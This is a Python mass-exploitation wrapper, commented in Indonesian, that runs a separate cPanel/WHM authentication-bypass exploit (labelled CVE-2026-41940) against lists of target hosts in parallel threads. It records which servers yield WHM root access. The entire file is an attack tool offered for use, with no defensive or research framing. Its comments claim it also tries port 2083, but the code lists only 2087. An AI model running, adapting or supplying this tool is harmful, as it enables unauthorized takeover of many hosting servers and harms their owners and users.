#!/usr/bin/env python3
# Mass Exploit for cPanel/WHM Auth Bypass (CVE-2026-41940)
# Supports: 2087 (WHM) + 2083 (cPanel)
# Tanpa mengubah logika atau codingan asal, hanya menambah port alternatif

import subprocess
import sys
import threading
import time
import os
from concurrent.futures import ThreadPoolExecutor, as_completed

banner = """
╔══════════════════════════════════════════════════════════════════════════════╗
║     cPanel/WHM Auth Bypass Mass Exploit (CVE-2026-41940)                     ║
║     PORTS: 2087 (WHM) - Overwrites success.txt langsung     ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""
print(banner)

# KONFIGURASI
THREADS = 20
TIMEOUT = 45
ORIGINAL_SCRIPT = "cpanel_exploit.py"  # Nama file exploit asli
OUTPUT_SUCCESS = "success.txt"
OUTPUT_FAILED = "failed.txt"
OUTPUT_ALL = "all_results.txt"

# Tambahan port cPanel (2083) tanpa mengubah yang sudah ada
DEFAULT_PORTS = [2087]

def prepare_target(target):
    """Siapkan target dengan format yang benar (default port 2087 dan 2083)"""
    target = target.strip()
    if not target:
        return None

    # Remove http:// or https:// jika ada
    if target.startswith("http://"):
        target = target.replace("http://", "")
    if target.startswith("https://"):
        target = target.replace("https://", "")

    # Remove trailing slash
    target = target.rstrip("/")

    # Cek apakah sudah ada port
    if ":" in target:
        # Sudah ada port, pakai apa adanya
        host, port = target.split(":")
        return f"https://{host}:{port}"
    else:
        # Tanpa port → coba semua port yang didukung (2087 dan 2083)
        return [f"https://{target}:{port}" for port in DEFAULT_PORTS]

def run_single_exploit(target_url, idx, total):
    """Jalankan exploit untuk 1 target"""
    
    # Siapkan command
    cmd = ["python3", ORIGINAL_SCRIPT, "--target", target_url]

    # Redirect output ke file sementara
    tmp_out = f"/tmp/cpanel_{idx}.out"
    tmp_err = f"/tmp/cpanel_{idx}.err"

    try:
        with open(tmp_out, "w") as out, open(tmp_err, "w") as err:
            result = subprocess.run(
                cmd,
                stdout=out,
                stderr=err,
                timeout=TIMEOUT,
                text=True
            )

        # Baca output
        with open(tmp_out, "r") as f:
            output = f.read()

        # Cek apakah berhasil
        if "now just login" in output.lower() or "verified we're whm root" in output.lower():
            with open(OUTPUT_SUCCESS, "a") as f:
                f.write(f"{target_url}|SUCCESS\n")
            with open(OUTPUT_ALL, "a") as f:
                f.write(f"{target_url}|SUCCESS\n")
            print(f"✅ [{idx}/{total}] SUCCESS: {target_url}")
            return True
        else:
            with open(OUTPUT_FAILED, "a") as f:
                f.write(f"{target_url}|FAILED\n")
            with open(OUTPUT_ALL, "a") as f:
                f.write(f"{target_url}|FAILED\n")
            print(f"❌ [{idx}/{total}] FAILED: {target_url}")
            return False

    except subprocess.TimeoutExpired:
        print(f"⏰ [{idx}/{total}] TIMEOUT: {target_url}")
        with open(OUTPUT_FAILED, "a") as f:
            f.write(f"{target_url}|TIMEOUT\n")
        return False
    except Exception as e:
        print(f"⚠️ [{idx}/{total}] ERROR: {target_url} - {e}")
        return False
    finally:
        # Bersihkan file temporary
        for f in [tmp_out, tmp_err]:
            if os.path.exists(f):
                os.remove(f)

def load_targets(file_path):
    """Load targets dari file"""
    targets = []
    with open(file_path, "r") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                result = prepare_target(line)
                if result:
                    if isinstance(result, list):
                        targets.extend(result)
                    else:
                        targets.append(result)
    return targets

def main():
    if len(sys.argv) < 2:
        print("Usage:")
        print(f"  python3 {sys.argv[0]} --file <targets.txt>")
        print(f"  python3 {sys.argv[0]} --single <target.com>")
        print(f"  python3 {sys.argv[0]} --list <target1> <target2> <target3>")
        print("\nContoh file targets.txt:")
        print("  example.com")
        print("  192.168.1.100")
        print("  https://server.com:2087")
        print("  server.com:2083")
        print("\n⚠️  Script otomatis akan coba port 2087 (WHM) dan 2083 (cPanel)")
        sys.exit(1)

    # Load targets
    if sys.argv[1] == "--file":
        targets = load_targets(sys.argv[2])
    elif sys.argv[1] == "--single":
        result = prepare_target(sys.argv[2])
        targets = result if isinstance(result, list) else [result]
    elif sys.argv[1] == "--list":
        targets = []
        for t in sys.argv[2:]:
            result = prepare_target(t)
            if isinstance(result, list):
                targets.extend(result)
            else:
                targets.append(result)
    else:
        print("Unknown option!")
        sys.exit(1)

    # Filter None
    targets = [t for t in targets if t]

    if not targets:
        print("[!] No valid targets found!")
        sys.exit(1)

    # Clear output files
    for f in [OUTPUT_SUCCESS, OUTPUT_FAILED, OUTPUT_ALL]:
        open(f, "w").close()

    total = len(targets)
    print(f"[*] Loaded {total} targets")
    print(f"[*] Threads: {THREADS}")
    print(f"[*] Timeout: {TIMEOUT}s per target")
    print(f"[*] Original script: {ORIGINAL_SCRIPT}")
    print(f"[*] Ports: {DEFAULT_PORTS}")
    print(f"[*] Output files: {OUTPUT_SUCCESS}, {OUTPUT_FAILED}, {OUTPUT_ALL}")
    print("\n" + "="*60)
    print("STARTING MASS EXPLOITATION...")
    print("="*60 + "\n")

    start_time = time.time()
    success_count = 0

    # Run parallel
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {}
        idx = 0
        for target in targets:
            idx += 1
            future = executor.submit(run_single_exploit, target, idx, total)
            futures[future] = target

        for future in as_completed(futures):
            if future.result():
                success_count += 1

    elapsed = time.time() - start_time

    # Summary
    print("\n" + "="*60)
    print("MASS EXPLOITATION COMPLETED!")
    print("="*60)
    print(f"📊 Total targets: {total}")
    print(f"✅ Success: {success_count}")
    print(f"❌ Failed: {total - success_count}")
    print(f"⏱️  Time taken: {elapsed:.2f} seconds")
    print(f"\n📁 Results saved to:")
    print(f"   - {OUTPUT_SUCCESS} (successful targets)")
    print(f"   - {OUTPUT_FAILED} (failed targets)")
    print(f"   - {OUTPUT_ALL} (all targets)")

    if success_count > 0:
        print(f"\n🔥 SUCCESSFUL TARGETS:")
        with open(OUTPUT_SUCCESS, "r") as f:
            for line in f:
                print(f"   {line.strip()}")

if __name__ == "__main__":
    main()
